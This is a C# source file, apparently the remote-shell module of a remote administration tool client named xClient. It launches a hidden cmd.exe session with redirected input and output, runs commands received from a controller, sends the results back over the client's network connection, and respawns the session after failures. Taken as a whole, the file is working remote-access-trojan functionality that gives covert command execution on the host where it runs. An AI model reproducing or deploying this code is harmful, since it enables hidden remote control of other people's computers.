using System;
using System.Diagnostics;
using System.Text;
using System.Threading;

namespace xClient.Core.RemoteShell
{
    public class Shell
    {
        private Process prc;
        private bool read;

        private void CreateSession()
        {
            prc = new Process
            {
                StartInfo = new ProcessStartInfo("cmd")
                {
                    UseShellExecute = false,
                    RedirectStandardInput = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true,
                    WorkingDirectory = @"C:\",
                    Arguments = "/K",
                }
            };

            prc.Start();
            new global::xClient.Core.Packets.ClientPackets.ShellCommandResponse(">> New Session created" + Environment.NewLine).Execute(Program._Client);

            new Thread(Redirect).Start();
        }

        private void Redirect()
        {
            try
            {
                bool isTestUsed = false;
                prc.StandardInput.WriteLine("test");
                prc.StandardInput.Flush();
                prc.StandardOutput.ReadLine();
                prc.StandardOutput.ReadLine();

                while (read)
                {
                    if (read && prc.HasExited)
                        throw new Exception("session unexpectedly closed");

                    StringBuilder commandResult = new StringBuilder();

                    prc.StandardOutput.ReadLine();

                    while (true)
                    {
                        string line = prc.StandardOutput.ReadLine();

                        if (string.IsNullOrEmpty(line))
                            break;

                        if (!isTestUsed)
                        {
                            isTestUsed = line.Contains("test");
                            if (isTestUsed)
                                break;
                        }

                        commandResult.AppendLine(line);
                    }

                    commandResult.AppendLine();

                    new global::xClient.Core.Packets.ClientPackets.ShellCommandResponse(commandResult.ToString()).Execute(Program._Client);
                }
            }
            catch
            {
                CreateSession();
            }
        }

        public bool ExecuteCommand(string command)
        {
            if (!prc.HasExited)
            {
                prc.StandardInput.WriteLine(command);
                prc.StandardInput.WriteLine();
                prc.StandardInput.Flush();
                return true;
            }
            return false;
        }

        public Shell()
        {
            read = true;
            CreateSession();
        }

        ~Shell()
        {
            read = false;
            try
            {
                if (!prc.HasExited)
                    prc.Kill();
            }
            catch
            { }
            new global::xClient.Core.Packets.ClientPackets.ShellCommandResponse(">> Session closed" + Environment.NewLine).Execute(Program._Client);
        }

        public void CloseSession()
        {
            read = false;
            try
            {
                if (!prc.HasExited)
                    prc.Kill();
            }
            catch
            { }
            new global::xClient.Core.Packets.ClientPackets.ShellCommandResponse(">> Session closed" + Environment.NewLine).Execute(Program._Client);
        }
    }
}
